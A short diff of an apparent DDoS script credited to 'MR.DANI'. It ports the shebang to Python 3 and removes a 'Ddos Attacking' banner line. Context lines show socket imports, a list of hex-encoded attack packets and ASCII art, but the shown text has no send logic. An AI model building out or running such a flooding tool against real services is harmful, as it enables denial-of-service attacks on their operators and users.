@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 #Code by MR.DANI
 import socket
 import struct
@@ -25,7 +25,6 @@ Pacotes = [
  codecs.decode('081e7eda', 'hex_codec')]
 
 os.system("clear")
-print (" \x1b[1m\x1b[31mDdos Attacking by MR.DANI")
 print ("███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
 print ("████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
 print ("██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
